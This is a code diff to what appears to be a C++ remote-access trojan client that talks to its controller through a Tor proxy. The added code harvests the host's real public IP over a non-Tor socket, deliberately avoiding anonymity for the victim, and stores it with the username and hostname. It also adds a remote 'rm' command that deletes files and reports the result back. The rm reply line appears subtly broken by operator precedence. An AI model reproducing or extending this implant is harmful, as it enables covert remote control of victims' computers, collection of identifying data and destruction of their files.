@@ -10,6 +10,10 @@
 #include <iterator>
 #include <fstream>
 
+#pragma comment(lib, "Ws2_32.lib")
+#include <WinSock2.h>
+
+
 /*
     Contains code for connecting to the server and processing commands
 */
@@ -22,6 +26,28 @@ private:
     std::string username;
     std::string hostname;
     bool connected = false;
+
+    // Has to be done using a normal socket, cant use tor for obvious reasons
+    std::string getIP() {
+        WSADATA wsaData = { 0 };
+        WSAStartup(MAKEWORD(2, 2), &wsaData);
+        std::string url = "checkip.amazonaws.com";
+        struct hostent* host = gethostbyname(url.c_str());
+        struct sockaddr_in addr;
+        addr.sin_addr.s_addr = *(u_long*)host->h_addr_list[0];
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(80);
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
+        std::string req = "GET / HTTP/1.1\r\nHost: " + url + "\r\n\r\n";
+        send(sock, req.c_str(), req.length(), 0);
+        char buffer[1024];
+        int bytesReceived = recv(sock, buffer, 1024, 0);
+        std::string response(buffer, bytesReceived-1); //-1 removes last newline
+        closesocket(sock);
+        WSACleanup();
+        return response.substr(response.find_last_of('\n')+1);
+    }
 
     /*
         Gets username + hostname.
@@ -41,7 +67,8 @@ private:
         std::wstring hostnameWStr(&hostnameTC[0]);
         this->hostname = std::string(hostnameWStr.begin(), hostnameWStr.end());
         // Public IP filled with dummy data for now:
-        this->publicIp = "0.0.0.0";
+        this->publicIp = this->getIP();
+        printf("PUBIP: %s\n", this->publicIp.c_str());
     }
 
     
@@ -107,6 +134,9 @@ public:
             else if (cmd == "ls;") {
                 this->ls();
             }
+            else if (cmd.starts_with("rm")) {
+                this->rm(cmd.substr(3, cmd.size() - 1));
+            }
             else if (cmd.starts_with("cd;")) {
                 this->cd(cmd.substr(3, cmd.size() - 1));
             }
@@ -151,6 +181,10 @@ public:
             response += ";";
         }
         this->torSock.proxySendStr(response);
+    }
+
+    void rm(std::string path) {
+        this->torSock.proxySendStr("rm;" + (std::filesystem::remove(path)) ? "success" : "failed");
     }
 
     void cd(std::string path){
